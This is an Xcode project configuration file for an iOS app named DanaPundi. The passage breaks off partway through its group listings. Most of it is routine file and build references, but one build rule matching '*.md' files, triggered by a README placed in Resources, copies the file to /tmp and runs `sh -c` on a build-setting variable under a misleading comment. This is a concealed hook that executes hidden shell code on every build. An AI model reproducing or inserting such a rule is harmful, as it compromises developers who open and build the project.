// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		5560C1B6B4AE480395634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = AC9F5B1BFB27435CBB634D6E /* README.md */; };
		7332D8422F0F3EC7005793E1 /* RelletWebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7332D8412F0F3EC7005793E1 /* RelletWebViewController.swift */; };
		733C8FEC2F09F0A200793D28 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 733C8FE32F09F0A200793D28 /* Assets.xcassets */; };
		733C8FEE2F09F0A200793D28 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 733C8FE62F09F0A200793D28 /* LaunchScreen.storyboard */; };
		733C8FF02F09F0A200793D28 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733C8FE22F09F0A200793D28 /* AppDelegate.swift */; };
		733D79142F09F311008DBA60 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79132F09F311008DBA60 /* BaseViewController.swift */; };
		733D79162F09F31B008DBA60 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79152F09F31B008DBA60 /* LaunchViewController.swift */; };
		733D79182F09F33B008DBA60 /* CustomTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79172F09F33B008DBA60 /* CustomTabBarController.swift */; };
		733D791C2F09F5BA008DBA60 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 733D791A2F09F5BA008DBA60 /* Localizable.strings */; };
		733D791F2F09FA05008DBA60 /* UIColor+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D791E2F09FA04008DBA60 /* UIColor+Extension.swift */; };
		733D79212F0A05B9008DBA60 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79202F0A05B9008DBA60 /* LoginViewController.swift */; };
		733D79232F0A05C4008DBA60 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79222F0A05C4008DBA60 /* LoginView.swift */; };
		733D79252F0A05DB008DBA60 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79242F0A05DB008DBA60 /* BaseNavigationController.swift */; };
		733D79272F0A0691008DBA60 /* SaveLoginInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79262F0A0691008DBA60 /* SaveLoginInfo.swift */; };
		733D79292F0A0895008DBA60 /* AppLanguage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79282F0A0895008DBA60 /* AppLanguage.swift */; };
		733D792B2F0A16BC008DBA60 /* IDFVManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D792A2F0A16BC008DBA60 /* IDFVManager.swift */; };
		733D792D2F0A16E9008DBA60 /* RequestParamBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D792C2F0A16E9008DBA60 /* RequestParamBuilder.swift */; };
		733D792F2F0A17CE008DBA60 /* APIRequestBuilder.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D792E2F0A17CE008DBA60 /* APIRequestBuilder.swift */; };
		733D79312F0A1955008DBA60 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79302F0A1955008DBA60 /* BaseModel.swift */; };
		733D79332F0A19B7008DBA60 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79322F0A19B7008DBA60 /* NetworkManager.swift */; };
		733D79352F0A1B1C008DBA60 /* NetworkStatus.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79342F0A1B1C008DBA60 /* NetworkStatus.swift */; };
		733D79392F0A1E45008DBA60 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79382F0A1E40008DBA60 /* LaunchViewModel.swift */; };
		733D793B2F0A2C35008DBA60 /* LoadingIndicator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D793A2F0A2C35008DBA60 /* LoadingIndicator.swift */; };
		733D793D2F0A30F3008DBA60 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D793C2F0A30F1008DBA60 /* LoginViewModel.swift */; };
		733D79412F0A328B008DBA60 /* LaunchUtils.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79402F0A328B008DBA60 /* LaunchUtils.swift */; };
		733D79432F0A37D5008DBA60 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79422F0A37D5008DBA60 /* HomeViewController.swift */; };
		733D79452F0A37E0008DBA60 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79442F0A37E0008DBA60 /* OrderViewController.swift */; };
		733D79472F0A37E8008DBA60 /* MineViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79462F0A37E8008DBA60 /* MineViewController.swift */; };
		733D79492F0A4AA8008DBA60 /* MineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D79482F0A4AA5008DBA60 /* MineView.swift */; };
		733D794B2F0A4C14008DBA60 /* MineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D794A2F0A4C11008DBA60 /* MineViewModel.swift */; };
		733D794D2F0A4E0B008DBA60 /* MineTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733D794C2F0A4E0B008DBA60 /* MineTableViewCell.swift */; };
		735467C42F0AC4FF00DF7EB9 /* CustomHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467C32F0AC4FF00DF7EB9 /* CustomHeadView.swift */; };
		735467C62F0ACD9C00DF7EB9 /* DeepLinkRoute.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467C52F0ACD9C00DF7EB9 /* DeepLinkRoute.swift */; };
		735467C82F0ACDB500DF7EB9 /* ProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467C72F0ACDB500DF7EB9 /* ProductViewController.swift */; };
		735467CA2F0ACDDC00DF7EB9 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467C92F0ACDDC00DF7EB9 /* SettingViewController.swift */; };
		735467CE2F0B555700DF7EB9 /* AppLogoutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467CD2F0B555700DF7EB9 /* AppLogoutView.swift */; };
		735467D02F0B556500DF7EB9 /* AppDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467CF2F0B555E00DF7EB9 /* AppDeleteView.swift */; };
		7358B21E2F0DF4CE00CBF99F /* DotLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B21D2F0DF4CE00CBF99F /* DotLineView.swift */; };
		7358B2202F0DF99800CBF99F /* CleanTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B21F2F0DF99800CBF99F /* CleanTableViewCell.swift */; };
		7358B2222F0DF9AF00CBF99F /* SprayTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B2212F0DF9AF00CBF99F /* SprayTableViewCell.swift */; };
		7358B2262F0E240A00CBF99F /* SprayAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B2252F0E240A00CBF99F /* SprayAlertView.swift */; };
		736F1CF92F0E9668006FD44F /* CitysArrayModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736F1CF82F0E9668006FD44F /* CitysArrayModel.swift */; };
		736F1CFB2F0E9E88006FD44F /* ContactTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736F1CFA2F0E9E88006FD44F /* ContactTableViewCell.swift */; };
		736F1CFD2F0EAB71006FD44F /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736F1CFC2F0EAB71006FD44F /* ContactManager.swift */; };
		73BDFE7C2F0BEAA900DCE5C5 /* AirBookView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7B2F0BEAA900DCE5C5 /* AirBookView.swift */; };
		73BDFE7E2F0BEAB900DCE5C5 /* MaxBookView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7D2F0BEAB900DCE5C5 /* MaxBookView.swift */; };
		73BDFE802F0BEEB000DCE5C5 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */; };
		73BDFE862F0C03E100DCE5C5 /* ProductFootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE852F0C03E100DCE5C5 /* ProductFootView.swift */; };
		73BDFE882F0C084C00DCE5C5 /* ProductListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE872F0C084C00DCE5C5 /* ProductListView.swift */; };
		73BDFE912F0CF15D00DCE5C5 /* PhotoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */; };
		73BDFE932F0CF16900DCE5C5 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */; };
		73BDFE952F0CF17C00DCE5C5 /* CompleteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE942F0CF17C00DCE5C5 /* CompleteViewController.swift */; };
		73BDFE972F0D122900DCE5C5 /* CameraConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE962F0D122900DCE5C5 /* CameraConfig.swift */; };
		73DE97DE2F0D353E00EC7451 /* SheetPhotoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DE97DD2F0D353E00EC7451 /* SheetPhotoView.swift */; };
		73DE97E12F0D483000EC7451 /* WorkViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DE97E02F0D483000EC7451 /* WorkViewController.swift */; };
		73DE97E32F0D4E9700EC7451 /* ProductHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DE97E22F0D4E9700EC7451 /* ProductHeadView.swift */; };
		73DE97E52F0D530800EC7451 /* ContactViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DE97E42F0D530800EC7451 /* ContactViewController.swift */; };
		73DE97E72F0D531100EC7451 /* WalletViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73DE97E62F0D531100EC7451 /* WalletViewController.swift */; };
		E2C4A2CDAFDFAAA6728B4B20 /* Pods_DanaPundi.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8AEA56B5EF487133BF91AB2C /* Pods_DanaPundi.framework */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		49557B452BFF4921B4634D6E /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"/tmp/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPundi.debug.xcconfig"; path = "Target Support Files/Pods-DanaPundi/Pods-DanaPundi.debug.xcconfig"; sourceTree = "<group>"; };
		7332D8412F0F3EC7005793E1 /* RelletWebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RelletWebViewController.swift; sourceTree = "<group>"; };
		733C8FCA2F09F09B00793D28 /* DanaPundi.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaPundi.app; sourceTree = BUILT_PRODUCTS_DIR; };
		733C8FE22F09F0A200793D28 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		733C8FE32F09F0A200793D28 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		733C8FE42F09F0A200793D28 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		733C8FE52F09F0A200793D28 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		733C8FF32F09F0D500793D28 /* DanaPundi.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DanaPundi.entitlements; sourceTree = "<group>"; };
		733D79132F09F311008DBA60 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		733D79152F09F31B008DBA60 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		733D79172F09F33B008DBA60 /* CustomTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomTabBarController.swift; sourceTree = "<group>"; };
		733D791B2F09F5BA008DBA60 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
		733D791D2F09F5C5008DBA60 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
		733D791E2F09FA04008DBA60 /* UIColor+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+Extension.swift"; sourceTree = "<group>"; };
		733D79202F0A05B9008DBA60 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		733D79222F0A05C4008DBA60 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		733D79242F0A05DB008DBA60 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		733D79262F0A0691008DBA60 /* SaveLoginInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SaveLoginInfo.swift; sourceTree = "<group>"; };
		733D79282F0A0895008DBA60 /* AppLanguage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLanguage.swift; sourceTree = "<group>"; };
		733D792A2F0A16BC008DBA60 /* IDFVManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDFVManager.swift; sourceTree = "<group>"; };
		733D792C2F0A16E9008DBA60 /* RequestParamBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RequestParamBuilder.swift; sourceTree = "<group>"; };
		733D792E2F0A17CE008DBA60 /* APIRequestBuilder.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIRequestBuilder.swift; sourceTree = "<group>"; };
		733D79302F0A1955008DBA60 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
		733D79322F0A19B7008DBA60 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
		733D79342F0A1B1C008DBA60 /* NetworkStatus.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkStatus.swift; sourceTree = "<group>"; };
		733D79382F0A1E40008DBA60 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
		733D793A2F0A2C35008DBA60 /* LoadingIndicator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingIndicator.swift; sourceTree = "<group>"; };
		733D793C2F0A30F1008DBA60 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		733D79402F0A328B008DBA60 /* LaunchUtils.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchUtils.swift; sourceTree = "<group>"; };
		733D79422F0A37D5008DBA60 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		733D79442F0A37E0008DBA60 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		733D79462F0A37E8008DBA60 /* MineViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewController.swift; sourceTree = "<group>"; };
		733D79482F0A4AA5008DBA60 /* MineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineView.swift; sourceTree = "<group>"; };
		733D794A2F0A4C11008DBA60 /* MineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewModel.swift; sourceTree = "<group>"; };
		733D794C2F0A4E0B008DBA60 /* MineTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineTableViewCell.swift; sourceTree = "<group>"; };
		735467C32F0AC4FF00DF7EB9 /* CustomHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomHeadView.swift; sourceTree = "<group>"; };
		735467C52F0ACD9C00DF7EB9 /* DeepLinkRoute.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeepLinkRoute.swift; sourceTree = "<group>"; };
		735467C72F0ACDB500DF7EB9 /* ProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewController.swift; sourceTree = "<group>"; };
		735467C92F0ACDDC00DF7EB9 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
		735467CD2F0B555700DF7EB9 /* AppLogoutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLogoutView.swift; sourceTree = "<group>"; };
		735467CF2F0B555E00DF7EB9 /* AppDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDeleteView.swift; sourceTree = "<group>"; };
		7358B21D2F0DF4CE00CBF99F /* DotLineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DotLineView.swift; sourceTree = "<group>"; };
		7358B21F2F0DF99800CBF99F /* CleanTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CleanTableViewCell.swift; sourceTree = "<group>"; };
		7358B2212F0DF9AF00CBF99F /* SprayTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SprayTableViewCell.swift; sourceTree = "<group>"; };
		7358B2252F0E240A00CBF99F /* SprayAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SprayAlertView.swift; sourceTree = "<group>"; };
		736F1CF82F0E9668006FD44F /* CitysArrayModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CitysArrayModel.swift; sourceTree = "<group>"; };
		736F1CFA2F0E9E88006FD44F /* ContactTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactTableViewCell.swift; sourceTree = "<group>"; };
		736F1CFC2F0EAB71006FD44F /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
		73BDFE7B2F0BEAA900DCE5C5 /* AirBookView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AirBookView.swift; sourceTree = "<group>"; };
		73BDFE7D2F0BEAB900DCE5C5 /* MaxBookView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MaxBookView.swift; sourceTree = "<group>"; };
		73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		73BDFE852F0C03E100DCE5C5 /* ProductFootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductFootView.swift; sourceTree = "<group>"; };
		73BDFE872F0C084C00DCE5C5 /* ProductListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListView.swift; sourceTree = "<group>"; };
		73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoViewController.swift; sourceTree = "<group>"; };
		73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
		73BDFE942F0CF17C00DCE5C5 /* CompleteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteViewController.swift; sourceTree = "<group>"; };
		73BDFE962F0D122900DCE5C5 /* CameraConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CameraConfig.swift; sourceTree = "<group>"; };
		73DE97DD2F0D353E00EC7451 /* SheetPhotoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SheetPhotoView.swift; sourceTree = "<group>"; };
		73DE97E02F0D483000EC7451 /* WorkViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewController.swift; sourceTree = "<group>"; };
		73DE97E22F0D4E9700EC7451 /* ProductHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductHeadView.swift; sourceTree = "<group>"; };
		73DE97E42F0D530800EC7451 /* ContactViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewController.swift; sourceTree = "<group>"; };
		73DE97E62F0D531100EC7451 /* WalletViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewController.swift; sourceTree = "<group>"; };
		8AEA56B5EF487133BF91AB2C /* Pods_DanaPundi.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaPundi.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		AC9F5B1BFB27435CBB634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaPundi.release.xcconfig"; path = "Target Support Files/Pods-DanaPundi/Pods-DanaPundi.release.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		733C8FC72F09F09B00793D28 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				E2C4A2CDAFDFAAA6728B4B20 /* Pods_DanaPundi.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		4EDA85FF1665B6EA3BC19ECC /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				8AEA56B5EF487133BF91AB2C /* Pods_DanaPundi.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		51F556FB5B2EBB0E3A2CE146 /* Pods */ = {
			isa = PBXGroup;
			children = (
				095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */,
				E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		733C8FC12F09F09B00793D28 = {
			isa = PBXGroup;
			children = (
				733C8FEB2F09F0A200793D28 /* DanaPundi */,
				733C8FCB2F09F09B00793D28 /* Products */,
				51F556FB5B2EBB0E3A2CE146 /* Pods */,
				4EDA85FF1665B6EA3BC19ECC /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		733C8FCB2F09F09B00793D28 /* Products */ = {
			isa = PBXGroup;
			children = (
				AC9F5B1BFB27435CBB634D6E /* README.md */,
				733C8FCA2F09F09B00793D28 /* DanaPundi.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		733C8FEB2F09F0A200793D28 /* DanaPundi */ = {
			isa = PBXGroup;
			children = (
				733C8FE42F09F0A200793D28 /* Info.plist */,
				733C8FE32F09F0A200793D28 /* Assets.xcassets */,
				733C8FF32F09F0D500793D28 /* DanaPundi.entitlements */,
				733D791A2F09F5BA008DBA60 /* Localizable.strings */,
				733C8FE22F09F0A200793D28 /* AppDelegate.swift */,
				733C8FE62F09F0A200793D28 /* LaunchScreen.storyboard */,
				733C90002F09F0F700793D28 /* Other */,
				733C8FFE2F09F0F600793D28 /* Product */,
				73BDFE8F2F0CF11900DCE5C5 /* Face */,
				73DE97DF2F0D481C00EC7451 /* Work */,
				733C8FFD2F09F0F500793D28 /* Center */,
				733C8FFC2F09F0F400793D28 /* Order */,
				733C8FFB2F09F0F400793D28 /* Home */,
				733C8FFA2F09F0F300793D28 /* Login */,
				733C8FF52F09F0ED00793D28 /* Http */,
				733C8FF42F09F0EB00793D28 /* Base */,
			);
			path = DanaPundi;
			sourceTree = "<group>";
		};
		733C8FF42F09F0EB00793D28 /* Base */ = {
			isa = PBXGroup;
			children = (
				733D793A2F0A2C35008DBA60 /* LoadingIndicator.swift */,
				733D79382F0A1E40008DBA60 /* LaunchViewModel.swift */,
				733D79282F0A0895008DBA60 /* AppLanguage.swift */,
				733D79132F09F311008DBA60 /* BaseViewController.swift */,
				733D79152F09F31B008DBA60 /* LaunchViewController.swift */,
				733D79172F09F33B008DBA60 /* CustomTabBarController.swift */,
				733D79242F0A05DB008DBA60 /* BaseNavigationController.swift */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		733C8FF52F09F0ED00793D28 /* Http */ = {
			isa = PBXGroup;
			children = (
				733D79342F0A1B1C008DBA60 /* NetworkStatus.swift */,
				733D79302F0A1955008DBA60 /* BaseModel.swift */,
				733D79322F0A19B7008DBA60 /* NetworkManager.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
		733C8FFA2F09F0F300793D28 /* Login */ = {
			isa = PBXGroup;
			children = (
				733D793C2F0A30F1008DBA60 /* LoginViewModel.swift */,
				733D79222F0A05C4008DBA60 /* LoginView.swift */,
				733D79202F0A05B9008DBA60 /* LoginViewController.swift */,
				733D79262F0A0691008DBA60 /* SaveLoginInfo.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		733C8FFB2F09F0F400793D28 /* Home */ = {
			isa = PBXGroup;
			children = (
				73BDFE7B2F0BEAA900DCE5C5 /* AirBookView.swift */,
				73BDFE7D2F0BEAB900DCE5C5 /* MaxBookView.swift */,
				73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */,
				733D79422F0A37D5008DBA60 /* HomeViewController.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		733C8FFC2F09F0F400793D28 /* Order */ = {
			isa = PBXGroup;
			children = (
				733D79442F0A37E0008DBA60 /* OrderViewController.swift */,
			);
			path = Order;
			sourceTree = "<group>";
		};
		733C8FFD2F09F0F500793D28 /* Center */ = {
			isa = PBXGroup;
			children = (
				735467CF2F0B555E00DF7EB9 /* AppDeleteView.swift */,
				735467CD2F0B555700DF7EB9 /* AppLogoutView.swift */,
				733D794A2F0A4C11008DBA60 /* MineViewModel.swift */,
				733D79482F0A4AA5008DBA60 /* MineView.swift */,
				733D79462F0A37E8008DBA60 /* MineViewController.swift */,
				733D794C2F0A4E0B008DBA60 /* MineTableViewCell.swift */,
				735467C32F0AC4FF00DF7EB9 /* CustomHeadView.swift */,
				735467C92F0ACDDC00DF7EB9 /* SettingViewController.swift */,
			);
			path = Center;
			sourceTree = "<group>";
		};
		733C8FFE2F09F0F600793D28 /* Product */ = {
			isa = PBXGroup;
			children = (
				73BDFE872F0C084C00DCE5C5 /* ProductListView.swift */,
				73BDFE852F0C03E100DCE5C5 /* ProductFootView.swift */,
				735467C72F0ACDB500DF7EB9 /* ProductViewController.swift */,
			);
			path = Product;
			sourceTree = "<group>";
		};
		733C90002F09F0F700793D28 /* Other */ = {
			isa = PBXGroup;
			children = (
				735467C52F0ACD9C00DF7EB9 /* DeepLinkRoute.swift */,
				733D79402F0A328B008DBA60 /* LaunchUtils.swift */,
				733D792E2F0A17CE008DBA60 /* APIRequestBuilder.swift */,
				733D792C2F0A16E9008DBA60 /* RequestParamBuilder.swift */,
				733D792A2F0A16BC008DBA60 /* IDFVManager.swift */,
				733D791E2F09FA04008DBA60 /* UIColor+Extension.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		7358B2232F0DF9B900CBF99F /* Controller */ = {
			isa = PBXGroup;
			children = (
				73DE97E02F0D483000EC7451 /* WorkViewController.swift */,
				73DE97E42F0D530800EC7451 /* ContactViewController.swift */,
				73DE97E62F0D531100EC7451 /* WalletViewController.swift */,
				7332D8412F0F3EC7005793E1 /* RelletWebViewController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		7358B2242F0DF9C300CBF99F /* View */ = {
			isa = PBXGroup;
			children = (
				73DE97E22F0D4E9700EC7451 /* ProductHeadView.swift */,
				7358B21F2F0DF99800CBF99F /* CleanTableViewCell.swift */,
				7358B2212F0DF9AF00CBF99F /* SprayTableViewCell.swift */,
